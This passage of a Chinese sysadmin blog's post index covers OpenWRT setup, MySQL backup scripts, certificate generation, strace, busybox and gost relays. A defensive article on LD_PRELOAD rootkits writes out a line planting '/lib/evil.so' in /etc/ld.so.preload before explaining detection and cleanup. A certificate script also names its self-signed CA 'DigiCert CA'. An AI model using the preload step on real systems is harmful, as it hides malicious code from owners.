IMG镜像拷贝到U盘目录 软路由通电, F12从U盘引导进入PE PE下完成OpenWRT IMG烧录 12345::PE环境下，我的存放IMG镜像的U盘的盘符是 U:: Win+R,运行cmdC:\\xxx\\xxx&gt; u:U:&gt; physdiskwrite -u OpenWRT_xxx.img 根据提示输入0, 即烧录到第0块磁盘上，紧接着输入y确认，稍等片刻即可写入完成。 二、剩余空间扩容IMG烧录完成后，紧接着在PE环境下，打开“DiskGenus”分区管理工具，找到软路由的分区。 右击 “空闲的14G左右的空间” — &gt; “将可用空间分配给分区” —- &gt; 根据提示分配给”160M” 左右的分区 最后，拔掉U盘，重启即可。 三、更换源1cp /etc/opkg/distfeeds.conf /etc/opkg/distfeeds.conf.bak cat /etc/opkg/distfeeds.conf 12345678#清华源src/gz openwrt_core http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/targets/x86/64/packagessrc/gz openwrt_base http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/packages/x86_64/basesrc/gz openwrt_freifunk http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/packages/x86_64/freifunksrc/gz openwrt_luci http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/packages/x86_64/lucisrc/gz openwrt_packages http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/packages/x86_64/packagessrc/gz openwrt_routing http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/packages/x86_64/routingsrc/gz openwrt_telephony http://mirrors.tuna.tsinghua.edu.cn/openwrt/snapshots/packages/x86_64/telephony","categories":[],"tags":[{"name":"openwrt","slug":"openwrt","permalink":"https://garywu520.github.io/tags/openwrt/"},{"name":"扩容","slug":"扩容","permalink":"https://garywu520.github.io/tags/%E6%89%A9%E5%AE%B9/"},{"name":"分区","slug":"分区","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%8C%BA/"},{"name":"IMG","slug":"IMG","permalink":"https://garywu520.github.io/tags/IMG/"}]},{"title":"crt转pfx格式证书","slug":"crt转pfx格式证书","date":"2020-08-06T12:09:12.000Z","updated":"2020-08-06T12:10:29.603Z","comments":true,"path":"2020/08/06/crt转pfx格式证书/","link":"","permalink":"https://garywu520.github.io/2020/08/06/crt%E8%BD%ACpfx%E6%A0%BC%E5%BC%8F%E8%AF%81%E4%B9%A6/","excerpt":"","text":"IIS要求证书格式是pfx, 故需要使用crt和key证书合成pfx证书 合成pfx证书 12openssl pkcs12 -export -out server.pfx -inkey server.key -in server.crt#输入2次导出密码(IIS导入时需要使用此密码,务必牢记)","categories":[],"tags":[{"name":"crt","slug":"crt","permalink":"https://garywu520.github.io/tags/crt/"},{"name":"pfx","slug":"pfx","permalink":"https://garywu520.github.io/tags/pfx/"},{"name":"ssl","slug":"ssl","permalink":"https://garywu520.github.io/tags/ssl/"}]},{"title":"windows bat备份mysql","slug":"windows-bat备份mysql","date":"2020-07-14T02:48:07.000Z","updated":"2020-07-14T02:50:09.233Z","comments":true,"path":"2020/07/14/windows-bat备份mysql/","link":"","permalink":"https://garywu520.github.io/2020/07/14/windows-bat%E5%A4%87%E4%BB%BDmysql/","excerpt":"1. 创建如下目录结构123md D:\\MySQL_Backup\\batmd D:\\MySQL_Backup\\sqlecho=&gt;D:\\MySQL_Backup\\bat\\mysql_bak.bat 123D:\\MySQL_Backup├─bat #自动化备份脚本文件└─sql #备份sql存储路径","text":"1. 创建如下目录结构123md D:\\MySQL_Backup\\batmd D:\\MySQL_Backup\\sqlecho=&gt;D:\\MySQL_Backup\\bat\\mysql_bak.bat 123D:\\MySQL_Backup├─bat #自动化备份脚本文件└─sql #备份sql存储路径 2. SQL备份脚本mysql_bak.bat 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152::此备份脚本，已经避免了锁表问题@echo off::设置备份路径set DIR=D:\\MySQL_Backup\\sql::echo %DIR%::递归删除30天前老sql文件forfiles /p %DIR% /s /m %DIR%\\game_*.sql /d -30 /c &quot;cmd /c del /f @path&quot;::获取年/月/日set YY=%date:~0,4%set MM=%date:~5,2%set DD=%date:~8,2%::echo %YY%-%MM%-%DD%::获取时/分/秒set timeHour=%time:~0,2%set timeMin=%time:~3,2%set timeSec=%time:~6,2%::把小时中的空格替换为0set &quot;timeHour=%timeHour: =0%&quot;::echo %timeHour%%timeMin%%timeSec%::创建当日目录-用于存放当日sqlmd %DIR%\\%YY%-%MM%-%DD% 2&gt;NUL::echo %DIR%\\%YY%-%MM%-%DD%::从配置文件筛选game_id字段作为变量,变量为%game_id%findstr &quot;game_id&quot; D:\\server\\server\\bin\\xxx.cfg &gt;D:\\MySQL_Backup\\bat\\tmp.txtfor /f &quot;delims== tokens=2&quot; %%i in (D:\\MySQL_Backup\\bat\\tmp.txt) do set id=%%iset &quot;id=%id: =%&quot;set game_id=game_%id%::echo %game_id%::定义mysql密码及备份文件名set pass=passwordset backfile=%game_id%_%YY%-%MM%-%DD%_%timeHour%%timeMin%%timeSec%.sql::echo %pass% %backfile%::备份&quot;C:\\Program Files\\MySQL\\MySQL Server 5.6\\bin\\mysqldump&quot; ^--opt --single-transaction=TRUE ^--user=root --password=&quot;%pass%&quot; --host=127.0.0.1 ^--protocol=tcp --port=3306 ^--default-character-set=utf8 --single-transaction=TRUE ^--routines -R ^--database %game_id% &gt; %DIR%\\%YY%-%MM%-%DD%\\%backfile%::echo %DIR%\\%YY%-%MM%-%DD%\\%backfile%@echo on 3. windows配置定时任务–命令行1schtasks /create /tn &quot;MySQL_Backup&quot; /tr D:\\MySQL_Backup\\bat\\mysql_bak.bat /sc HOURLY /mo 1 /ru &quot;&quot; /st 00:00:00 参数释义： 创建一个名为MySQL_Backup的定时任务，从00点00分00秒开始执行mysql_bak.bat, 每小时执行一次。 运行定时任务的系统账户是System账户，由 /ru 参数控制","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"https://garywu520.github.io/tags/windows/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"mysqldump","slug":"mysqldump","permalink":"https://garywu520.github.io/tags/mysqldump/"},{"name":"bat","slug":"bat","permalink":"https://garywu520.github.io/tags/bat/"}]},{"title":"supervisor管理启动jumpserver","slug":"supervisor管理启动jumpserver","date":"2020-06-13T06:10:35.000Z","updated":"2020-06-13T08:43:59.124Z","comments":true,"path":"2020/06/13/supervisor管理启动jumpserver/","link":"","permalink":"https://garywu520.github.io/2020/06/13/supervisor%E7%AE%A1%E7%90%86%E5%90%AF%E5%8A%A8jumpserver/","excerpt":"1. 编写外部脚本cat /home/test2/scripts/start_jumpserver.sh 12#!/bin/bashsource /opt/py3/bin/activate &amp;&amp; /opt/jumpserver/jms start 注：脚本中，启动命令不能使用-d后台启动方式 1chmod +x /home/test2/scripts/start_jumpserver.sh","text":"1. 编写外部脚本cat /home/test2/scripts/start_jumpserver.sh 12#!/bin/bashsource /opt/py3/bin/activate &amp;&amp; /opt/jumpserver/jms start 注：脚本中，启动命令不能使用-d后台启动方式 1chmod +x /home/test2/scripts/start_jumpserver.sh 2. supervisor配置文件1234567891011121314[program:jumpserver]user=test2command=/bin/sh /home/test2/scripts/start_jumpserver.shstdout_logfile=/var/log/jumpserver.logstderr_logfile=/var/log/jumpserver.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true#加载模块环境变量environment=PYTHONPATH=/opt/py3/lib/python3.6/site-packages 附：supervisor管理启动 koko组件 cat /home/umi_ops/scripts/start_koko.sh 12#!/bin/bashsource /opt/py3/bin/activate &amp;&amp; cd /opt/kokodir/ &amp;&amp; ./koko chmod +x /home/umi_ops/scripts/start_koko.sh cat /etc/supervisord.d/koko.conf 123456789101112[program:koko]user=umi_opscommand=/bin/sh /home/umi_ops/scripts/start_koko.shstdout_logfile=/var/log/koko.logstderr_logfile=/var/log/koko.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=trueenvironment=PYTHONPATH=/opt/py3/lib/python3.6/site-packages","categories":[],"tags":[{"name":"jumpserver","slug":"jumpserver","permalink":"https://garywu520.github.io/tags/jumpserver/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"},{"name":"koko","slug":"koko","permalink":"https://garywu520.github.io/tags/koko/"}]},{"title":"生成自签名SSL证书-shell脚本","slug":"生成自签名SSL证书-shell脚本","date":"2020-04-16T09:23:14.000Z","updated":"2020-04-16T09:26:36.935Z","comments":true,"path":"2020/04/16/生成自签名SSL证书-shell脚本/","link":"","permalink":"https://garywu520.github.io/2020/04/16/%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DSSL%E8%AF%81%E4%B9%A6-shell%E8%84%9A%E6%9C%AC/","excerpt":"1. 脚本说明 脚本依赖: openssl 脚本运行格式： 1./gen-cert.sh -a 算法 -d 域名 -n 证书文件名 -a 算法：有rsa和ecc 两种选项；rsa会生成4096位的key，ecc生成secp521r1 位的key -d 域名: 可以支持写多个域名，多个域名使用逗号分隔。其中, 第一个域名会作为CN（common name） -n 证书文件名: 脚本生成的证书文件都放在当前目录的certs目录下 -h 查看帮助","text":"1. 脚本说明 脚本依赖: openssl 脚本运行格式： 1./gen-cert.sh -a 算法 -d 域名 -n 证书文件名 -a 算法：有rsa和ecc 两种选项；rsa会生成4096位的key，ecc生成secp521r1 位的key -d 域名: 可以支持写多个域名，多个域名使用逗号分隔。其中, 第一个域名会作为CN（common name） -n 证书文件名: 脚本生成的证书文件都放在当前目录的certs目录下 -h 查看帮助 2. 脚本执行示例生成证书过程中，需要输入证书密码, 务必保证2次输入的密码一致 1./gen-cert.sh -a ecc -d *.ok.com,ok.com -n ok 3. 脚本内容123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/bin/bashusage() &#123; echo &quot;Usage: $0 [-a [rsa|ecc]] [-d &lt;domain&gt;] [-n &lt;name&gt;] [-h]&quot; echo &quot; Options:&quot; echo &quot; -a algorithm.[rsa|ecc]&quot; echo &quot; -d domain.example: xxx.com,abc.org,*.abc.org&quot; echo &quot; -n server key name&quot; echo &quot; -h help&quot; exit 1 &#125; srv_key_name=&quot;server&quot;while getopts &quot;a:d:n:h&quot; arg #选项后面的冒号表示该选项需要参数do case $arg in a) alg=$OPTARG #算法 ;; d) all_domain=$OPTARG #域名,逗号分隔 ;; n) srv_key_name=$OPTARG #服务器证书名称 ;; h) usage exit 0 ;; ?) #当有不认识的选项的时候arg为? usage exit 1 ;; esacdonedomain=&quot;domain.com&quot;san=&quot;DNS:*.$&#123;domain&#125;,DNS:$&#123;domain&#125;&quot;if [ -n &quot;$&#123;all_domain&#125;&quot; ]; then #分割域名 OLD_IFS=&quot;$IFS&quot; IFS=&quot;,&quot; domain_array=($all_domain) IFS=&quot;$OLD_IFS&quot; domain_len=$&#123;#domain_array[@]&#125; domain=$&#123;domain_array[0]&#125; san=&quot;&quot; for ((i=0;i&lt;domain_len;i++)) &#123; if [ $i = 0 ];then san=&quot;DNS:$&#123;domain_array[i]&#125;&quot; else san=&quot;$&#123;san&#125;,DNS:$&#123;domain_array[i]&#125;&quot; fi &#125;fica_subj=&quot;/C=US/ST=Florida/L=Miami/O=Little Havana/CN=DigiCert CA&quot;server_subj=&quot;/C=US/ST=Florida/L=Miami/O=Little Havana/CN=$&#123;domain&#125;&quot;#其中C是Country，ST是state，L是local，O是Organization，OU是Organization Unit，CN是common namedays=3650 #有效期10年echo &quot;san:$&#123;san&#125;&quot;sdir=&quot;certs&quot;ca_key_file=&quot;$&#123;sdir&#125;/ca.key&quot;ca_crt_file=&quot;$&#123;sdir&#125;/ca.crt&quot;srv_key_file=&quot;$&#123;sdir&#125;/$&#123;srv_key_name&#125;.key&quot;srv_csr_file=&quot;$&#123;sdir&#125;/$&#123;srv_key_name&#125;.csr&quot;srv_crt_file=&quot;$&#123;sdir&#125;/$&#123;srv_key_name&#125;.crt&quot;srv_p12_file=&quot;$&#123;sdir&#125;/$&#123;srv_key_name&#125;.p12&quot;srv_fullchain_file=&quot;$&#123;sdir&#125;/$&#123;srv_key_name&#125;-fullchain.crt&quot;cfg_san_file=&quot;$&#123;sdir&#125;/san.cnf&quot;#algorithm configif [[ $&#123;alg&#125; = &quot;rsa&quot; ]] ; then rsa_len=4096elif [[ $&#123;alg&#125; = &quot;ecc&quot; ]] ; then ecc_name=secp521r1else usage exit 1fi #ifendecho &quot;algorithm:$&#123;alg&#125;&quot;mkdir -p $&#123;sdir&#125;if [ ! -f &quot;$&#123;ca_key_file&#125;&quot; ]; then echo &quot;------------- gen ca key-----------------------&quot; if [[ $&#123;alg&#125; = &quot;rsa&quot; ]] ; then openssl genrsa -out $&#123;ca_key_file&#125; $&#123;rsa_len&#125; elif [[ $&#123;alg&#125; = &quot;ecc&quot; ]] ; then openssl ecparam -out $&#123;ca_key_file&#125; -name $&#123;ecc_name&#125; -genkey fi #ifend openssl req -new -x509 -days $&#123;days&#125; -key $&#123;ca_key_file&#125; -out $&#123;ca_crt_file&#125; -subj &quot;$&#123;ca_subj&#125;&quot;fiif [ ! -f &quot;$&#123;srv_key_file&#125;&quot; ]; then echo &quot;------------- gen server key-----------------------&quot; if [[ $&#123;alg&#125; = &quot;rsa&quot; ]] ; then openssl genrsa -out $&#123;srv_key_file&#125; $&#123;rsa_len&#125; elif [[ $&#123;alg&#125; = &quot;ecc&quot; ]] ; then openssl ecparam -genkey -name $&#123;ecc_name&#125; -out $&#123;srv_key_file&#125; fi #ifend openssl req -new -sha256 -key $&#123;srv_key_file&#125; -out $&#123;srv_csr_file&#125; -subj &quot;$&#123;server_subj&#125;&quot; printf &quot;[ SAN ]\\nauthorityKeyIdentifier=keyid,issuer\\nbasicConstraints=CA:FALSE\\nkeyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment\\nsubjectAltName=$&#123;san&#125;&quot; &gt; $&#123;cfg_san_file&#125; openssl x509 -req -days $&#123;days&#125; -sha256 -CA $&#123;ca_crt_file&#125; -CAkey $&#123;ca_key_file&#125; -CAcreateserial -in $&#123;srv_csr_file&#125; -out $&#123;srv_crt_file&#125; -extfile $&#123;cfg_san_file&#125; -extensions SAN cat $&#123;srv_crt_file&#125; $&#123;ca_crt_file&#125; &gt; $&#123;srv_fullchain_file&#125; openssl pkcs12 -export -inkey $&#123;srv_key_file&#125; -in $&#123;srv_crt_file&#125; -CAfile $&#123;ca_crt_file&#125; -chain -out $&#123;srv_p12_file&#125;fi 参考：简书-tinylk","categories":[],"tags":[{"name":"ssl","slug":"ssl","permalink":"https://garywu520.github.io/tags/ssl/"},{"name":"ca","slug":"ca","permalink":"https://garywu520.github.io/tags/ca/"},{"name":"ECC","slug":"ECC","permalink":"https://garywu520.github.io/tags/ECC/"},{"name":"key","slug":"key","permalink":"https://garywu520.github.io/tags/key/"},{"name":"RSA","slug":"RSA","permalink":"https://garywu520.github.io/tags/RSA/"},{"name":"secp256k1","slug":"secp256k1","permalink":"https://garywu520.github.io/tags/secp256k1/"},{"name":"prime256v1","slug":"prime256v1","permalink":"https://garywu520.github.io/tags/prime256v1/"}]},{"title":"strace命令-追踪指定pid进程","slug":"strace命令-追踪指定pid进程","date":"2020-04-14T07:41:25.000Z","updated":"2020-04-14T11:23:31.957Z","comments":true,"path":"2020/04/14/strace命令-追踪指定pid进程/","link":"","permalink":"https://garywu520.github.io/2020/04/14/strace%E5%91%BD%E4%BB%A4-%E8%BF%BD%E8%B8%AA%E6%8C%87%E5%AE%9Apid%E8%BF%9B%E7%A8%8B/","excerpt":"1适用场景：生产环境中，人为定位到某个业务某个进程可能存在问题时,就需要使用strace命令，对指定进程进行跟踪与调试，查找出罪魁祸首。 官网：https://strace.io/ 最新版下载：https://strace.io/files/5.6/","text":"1适用场景：生产环境中，人为定位到某个业务某个进程可能存在问题时,就需要使用strace命令，对指定进程进行跟踪与调试，查找出罪魁祸首。 官网：https://strace.io/ 最新版下载：https://strace.io/files/5.6/ 编译安装/更新123strace -V #版本过低yum remove -y strace 1234wget https://strace.io/files/5.6/strace-5.6.tar.xzxz -d strace-5.6.tar.xz &amp;&amp; tar -xvf strace-5.6.tarcd strace-5.6./configure &amp;&amp; make &amp;&amp; make install 12strace -Vcp strace /sbin/strace 常用用法1ps -ef|grep mysql|grep -v &quot;3307&quot;|grep -v grep| awk &#x27;&#123;print &quot; -p &quot; $2&#125;&#x27;|xargs strace -o /tmp/trace.log 注：首先查找并排除非有用项， 然后取出进程的“子进程PID”，最后把这个PID交给strace处理并把log输出到文档中","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ps","slug":"ps","permalink":"https://garywu520.github.io/tags/ps/"},{"name":"strace","slug":"strace","permalink":"https://garywu520.github.io/tags/strace/"},{"name":"pid","slug":"pid","permalink":"https://garywu520.github.io/tags/pid/"}]},{"title":"busybox下载及使用","slug":"busybox下载及使用","date":"2020-04-13T10:19:12.000Z","updated":"2020-04-13T10:20:19.346Z","comments":true,"path":"2020/04/13/busybox下载及使用/","link":"","permalink":"https://garywu520.github.io/2020/04/13/busybox%E4%B8%8B%E8%BD%BD%E5%8F%8A%E4%BD%BF%E7%94%A8/","excerpt":"什么是busybox?BusyBox集成了各种linux的标准命令，包括： shell,editor（vi,sed,awk等） 系统管理（coreutils、tar、bzip等） 网络应用（ping、ifconfig、wget等） 用户管理（login、su、useraddな等） 各种服务（crond、syslogd、httpd等） SELinux管理（load_policy、restorecon等）","text":"什么是busybox?BusyBox集成了各种linux的标准命令，包括： shell,editor（vi,sed,awk等） 系统管理（coreutils、tar、bzip等） 网络应用（ping、ifconfig、wget等） 用户管理（login、su、useraddな等） 各种服务（crond、syslogd、httpd等） SELinux管理（load_policy、restorecon等） 下载运行官网支持二进制下载，下载x86_64 二进制即可 官网：https://busybox.net/ 12# 二进制下载wget https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64 1234567[root@test]# cp busybox-x86_64 /sbin/busybox[root@test]# chmod +x /sbin/busybox[root@test]# ls -lh /sbin/busybox-rwxr-xr-x 1 root root 951K Apr 13 17:35 /sbin/busybox[root@test]# ldd /sbin/busyboxnot a dynamic executable 1234#基本使用busybox ping 1.1.1.1busybox topbusybox tail -1 /etc/passwd 特殊应用场景如果Linux系统被黑，基础命令如ls,cat 等等很可能已经被污染，因为他们均加载了公共共享库。而busybox不依赖于共享库运行，所以不会受到影响，查看到的结果算是比较靠谱的。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"busybox","slug":"busybox","permalink":"https://garywu520.github.io/tags/busybox/"},{"name":"tools","slug":"tools","permalink":"https://garywu520.github.io/tags/tools/"}]},{"title":"Linux共享库文件注入-防御与清理","slug":"Linux共享库文件注入-防御与清理","date":"2020-04-13T10:11:02.000Z","updated":"2020-04-13T10:12:36.196Z","comments":true,"path":"2020/04/13/Linux共享库文件注入-防御与清理/","link":"","permalink":"https://garywu520.github.io/2020/04/13/Linux%E5%85%B1%E4%BA%AB%E5%BA%93%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5-%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%B8%85%E7%90%86/","excerpt":"一. 何为共享库？ .so 文件在可执行程序运行之前就会预先加载，Linux 进程经常使用这些共享库。这种技术可以重写系统的库函数，只需要在预加载的链接库中重新定义相同名称的库函数，程序调用库函数时，重新定义的函数即会短路正常的库函数，这种技术可以用来重写系统中有漏洞的库函数，达到修复漏洞的目的。 ldd 命令可以对任何程序文件显示其共享库，如下面的：linux-vdso.so.1 123456789[root@test ~]# ldd /bin/date linux-vdso.so.1 =&gt; (0x00007ffea6320000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f2b2694a000) /lib64/ld-linux-x86-64.so.2 (0x00007f2b26d17000) [root@test ~]# ldd /bin/cat linux-vdso.so.1 =&gt; (0x00007ffdd356e000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fb1ac29f000) /lib64/ld-linux-x86-64.so.2 (0x00007fb1ac66c000)","text":"一. 何为共享库？ .so 文件在可执行程序运行之前就会预先加载，Linux 进程经常使用这些共享库。这种技术可以重写系统的库函数，只需要在预加载的链接库中重新定义相同名称的库函数，程序调用库函数时，重新定义的函数即会短路正常的库函数，这种技术可以用来重写系统中有漏洞的库函数，达到修复漏洞的目的。 ldd 命令可以对任何程序文件显示其共享库，如下面的：linux-vdso.so.1 123456789[root@test ~]# ldd /bin/date linux-vdso.so.1 =&gt; (0x00007ffea6320000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f2b2694a000) /lib64/ld-linux-x86-64.so.2 (0x00007f2b26d17000) [root@test ~]# ldd /bin/cat linux-vdso.so.1 =&gt; (0x00007ffdd356e000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fb1ac29f000) /lib64/ld-linux-x86-64.so.2 (0x00007fb1ac66c000) 二. 共享库隐患这种技术也可以被不怀好意的攻击者用来写rootkit,通过重写mkdir, mkdirat, chdir, fchdir, opendir, opendir64, fdopendir, readdir, readdir64等和系统文件，网络，进程相关的库函数来达到隐藏文件，进程的目的。相对于普通的用户空间rootkit而言，手段更加隐蔽，更加难以被发现，相对于内核模块rootkit来说，兼容性更好，编写难度更低，综合这两种优点，使得这类型rootkit逐年增多，难以查杀。 三. 动态库预加载型rootkit所用技术 linux动态链接库预加载机制 在linux操作系统的动态链接库加载过程中，动态链接器会读取LD_PRELOAD环境变量的值和默认配置文件/etc/ld.so.preload的文件内容，并将读取到的动态链接库进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载,它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。 全局符号介入机制 全局符号介入指的是应用程序调用库函数时，调用的库函数如果在多个动态链接库中都存在，即存在同名函数，那么链接器只会保留第一个链接的函数，而忽略后面链接进来的函数，所以只要预加载的全局符号中有和后加载的普通共享库中全局符号重名，那么就会覆盖后装载的共享库以及目标文件里的全局符号。 rootkit利用的技术点 因为动态链接库预加载机制和全局符号介入这两种系统机制,可以控制程序运行时的链接（Runtime linker），允许用户在程序运行前优先加载自定义的动态链接库，使得恶意动态链接库优先于正常动态链接库加载，根据全局符号介入的顺序原理来”短路”正常函数,执行攻击者定义的恶意函数。 从上图中我们可以看到3种利用方式： 将恶意动态链接库通过LD_PRELOAD环境变量进行加载 将恶意动态链接库通过/etc/ld.so.preload配置文件进行加载 修改动态链接器来实现恶意功能，例如修改动态链接器中默认的用于预加载的配置文件路径/etc/ld.so.preload为攻击者自定义路径，然后在里面写入要加载的恶意动态链接库，当然修改的姿势还有很多，如修改默认环境变量，直接将要hook的动态链接库写入到动态链接器当中。 四. 防御 - 动态链接库预加载型rootkit1：利用LD_PRELOAD加载恶意动态链接库 检测—-如果LD_PRELOAD中有值，则将该文件上传到virustotal或微步在线等恶意软件检测平台检测该文件是否正常 或认为判断是否为恶意程序 12[root@test ~]# echo $LD_PRELOAD/lib/evil.so 清除 1[root@test ~]# unset LD_PRELOAD 2. 利用/etc/ld.so.preload加载恶意动态链接库将恶意动态链接库路径写入/etc/ld.so.preload(没有则创建)配置文件中，及时生效。且对应的恶意动态链接库文件被隐藏 12[root@test ~]# echo &quot;/lib/evil.so&quot; &gt; /etc/ld.so.preload[root@test ~]# ls -lh /etc/ld.so.preload #结果看不到/lib/evil.so 检测 因为恶意动态链接库一般都有隐藏/etc/ld.so.preload文件的功能，我们使用普通的ls,cat等命令无法读取对应配置文件的内容，此时我们可以使用静态编译的ls命令,cat命令（推荐使用busybox自带命令)来绕过预加载的恶意动态链接库。 如下图，通过使用普通的cat命令和busybox中的cat命令查看/etc/ld.so.preload文件内容对比，即可判断出是否有通过/etc/ld.so.preload配置文件加载的恶意动态链接库。 12345[root@test ~]# cat /etc/ld.so.preloadcat: /etc/ld.so.preload: No such file or directory[root@test ~]# busybox cat /etc/ld.so.preload/lib/evil.so 清除 首先清除上方/etc/ld.so.preload文件中查看到的/lib/evil.so文件，使其无法正常预加载。然后清除/etc/ld.so.preload中的恶意文件内容，有的恶意动态链接库会修改该文件的隐藏权限，以及普通的读写权限，所以需要看一下，然后再清除，到此为止即清除成功。 123456[root@test ~]# mv /lib/evil.so /lib/test.so[root@test ~]# ls -lh /lib/evil.so[root@test ~]# busybox lsattr /etc/ld.so.preload- - - - - - - - - - /etc/ld.so.preload[root@test ~]# echo &quot;&quot; &gt;/etc/ld.so.preload 3. 修改动态链接器来实现恶意功能 检测 使用strace命令来查看预加载的配置文件是不是/etc/ld.so.preload文件，如下图，动态链接库预加载的配置文件是/sbin/.XsknPn3F而不是原有的配置文件，我们即可确认系统中存在修改动态链接器的rootkit 使用busybox自带的cat命令查看该文件，因为使用正常cat命令无法查看该文件，被预加载的库函数给隐藏了 清除 清除修改动态链接器的rootkit，需要使用相同系统的相同版本动态链接器替换被修改了的动态链接器，才能达到彻底清除的目的。暂时缓解的方式则是将上方检测过程中看到的恶意动态链接库删除，以及将对应的动态链接库配置文件中的内容清除。 参考：FreeBuf专栏","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"so","slug":"so","permalink":"https://garywu520.github.io/tags/so/"},{"name":"共享库","slug":"共享库","permalink":"https://garywu520.github.io/tags/%E5%85%B1%E4%BA%AB%E5%BA%93/"},{"name":"rookit","slug":"rookit","permalink":"https://garywu520.github.io/tags/rookit/"},{"name":"木马防御","slug":"木马防御","permalink":"https://garywu520.github.io/tags/%E6%9C%A8%E9%A9%AC%E9%98%B2%E5%BE%A1/"}]},{"title":"openwrt进程启动项","slug":"openwrt进程启动项","date":"2020-04-08T02:30:18.000Z","updated":"2020-04-09T07:19:32.625Z","comments":true,"path":"2020/04/08/openwrt进程启动项/","link":"","permalink":"https://garywu520.github.io/2020/04/08/openwrt%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E9%A1%B9/","excerpt":"openwrt是基于linux内核的路由操作系统，经过裁剪，因此与普通linux系统文件结构有所不同。 接下来，说说在openwrt里面添加自启动项","text":"openwrt是基于linux内核的路由操作系统，经过裁剪，因此与普通linux系统文件结构有所不同。 接下来，说说在openwrt里面添加自启动项 自建脚本格式： cat /etc/init.d/xxx 123456789101112#!/bin/sh /etc/rc.commonSTART=99STOP=15start() &#123; #启动命令&#125;stop() &#123; #killall 脚本自身名称 killall $0&#125; 1. 这里以GOST程序为例由于gost里面使用了gost可执行程序和ca.pem文件，故需要先通过OpenWRT WEB上传到指定目录 123mkdir &#x2F;etc&#x2F;gost&#x2F;chmod +x &#x2F;etc&#x2F;gost&#x2F;gost &amp;&amp; ln -sv &#x2F;etc&#x2F;gost&#x2F;gost &#x2F;sbin&#x2F;gostcp &#x2F;tmp&#x2F;uploads&#x2F;ca.pem &#x2F;etc&#x2F;gost&#x2F; 2. 新建启动文件cat /etc/init.d/gost 1234567891011#!&#x2F;bin&#x2F;sh &#x2F;etc&#x2F;rc.commonSTART&#x3D;99STOP&#x3D;15 start() &#123; &#x2F;sbin&#x2F;gost -L&#x3D;&quot;tcp:&#x2F;&#x2F;:1443&#x2F;127.0.0.1:443&quot; -F&#x3D;&quot;h2+tls:&#x2F;&#x2F;xx.xx.xx.xx:17072?ca&#x3D;&#x2F;etc&#x2F;gost&#x2F;ca.pem&quot; &#125; stop() &#123; killall $0&#125; 3. 其他12345#添加可执行权限chmod +x /etc/init.d/gost#创建一个软链/etc/init.d/gost enable 命令实质上是为脚本文件创建一个软链接, 链接路径: /etc/rc.d/S99gost 12#查看自己脚步自启动是on还是offfor F in /etc/init.d/* ; do $F enabled &amp;&amp; echo $F on || echo $F **disabled**; done 4. 启动脚本 方式1：打开openwrt Web, 找到启动项，在里面找到gost，点击启动即可 方式2：重启openwrt即可","categories":[],"tags":[{"name":"openwrt","slug":"openwrt","permalink":"https://garywu520.github.io/tags/openwrt/"},{"name":"启动项","slug":"启动项","permalink":"https://garywu520.github.io/tags/%E5%90%AF%E5%8A%A8%E9%A1%B9/"},{"name":"进程管理","slug":"进程管理","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"软路由","slug":"软路由","permalink":"https://garywu520.github.io/tags/%E8%BD%AF%E8%B7%AF%E7%94%B1/"}]},{"title":"使用Relay+TLS加密转发TCP或UDP数据","slug":"使用Relay-TLS加密转发TCP或UDP数据","date":"2020-04-01T10:49:21.000Z","updated":"2020-04-02T08:06:21.190Z","comments":true,"path":"2020/04/01/使用Relay-TLS加密转发TCP或UDP数据/","link":"","permalink":"https://garywu520.github.io/2020/04/01/%E4%BD%BF%E7%94%A8Relay-TLS%E5%8A%A0%E5%AF%86%E8%BD%AC%E5%8F%91TCP%E6%88%96UDP%E6%95%B0%E6%8D%AE/","excerpt":"Relay+TLS转发UDP端口数据(实际上是TLS-DNS) 环境国外有一台无污染DNS服务器，想在大陆局域网使用它进行直接无污染解析，为了安全考虑，计划使用TLS对Relay数据包进行加密","text":"Relay+TLS转发UDP端口数据(实际上是TLS-DNS) 环境国外有一台无污染DNS服务器，想在大陆局域网使用它进行直接无污染解析，为了安全考虑，计划使用TLS对Relay数据包进行加密 1.服务端：12#运行Relay+TLS隧道--使用默认SSL证书gost -L relay+tls://:12345 或 12#运行Relay+TLS隧道--使用指定SSL证书gost -L=&quot;relay+tls://:12345?cert=/opt/gost/fullchain.crt&amp;key=/opt/gost/server.key&quot; 注：Iptables开放12345端口 2. 客户端：12#对于客户端，SSL证书校验默认关闭gost -L 